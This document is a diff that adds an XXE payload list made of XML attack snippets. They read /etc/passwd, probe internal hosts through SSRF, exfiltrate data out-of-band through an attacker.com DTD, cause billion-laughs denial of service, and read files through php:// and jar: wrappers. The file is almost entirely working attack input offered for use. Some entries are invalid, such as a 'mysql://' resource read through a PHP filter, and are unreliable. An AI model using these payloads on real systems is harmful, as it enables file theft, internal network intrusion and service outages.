@@ -1,0 +1,88 @@
+# Basic
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+# XXE Payload to Retrieve System Files:
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "file:///etc/passwd">
+]>
+<r>&sp;</r>
+
+# XXE Payload for SSRF (Server-Side Request Forgery):
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.example.com/"> ]>
+<foo>&xxe;</foo>
+
+# XXE Payload to Probe Internal Networks:
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://internal-network.example.com/test.txt">
+%remote;
+]>
+<root/>
+
+# Blind XXE for Exfiltrating Data Out-of-Band:
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+%all;
+]>
+<data>&send;</data>
+
+# XXE Payload to Execute a Denial of Service Attack:
+
+<?xml version="1.0"?>
+<!DOCTYPE kaboom [
+<!ENTITY lol "LOL">
+<!ELEMENT kaboom ANY >
+<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;...">
+]>
+<kaboom>&lol2;</kaboom>
+
+# XXE for Exfiltrating Data using Parameter Entities:
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY callme "%xxe;">
+]>
+<foo>&callme;</foo>
+
+# XXE with Base64 Encoding to Obfuscate the Attack:
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY callme "%xxe;">
+]>
+<foo>&callme;</foo>
+
+
+# XXE to Retrieve Data from a Database (via PHP):
+
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=mysql://root:password@localhost/database">
+<!ENTITY callme "%xxe;">
+]>
+<foo>&callme;</foo>
+
+#XXE for Retrieving Data from Java Applications:
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "jar:file:///path/to/app.jar!/resource.txt">
+<!ENTITY callme "%xxe;">
+]>
+<foo>&callme;</foo>
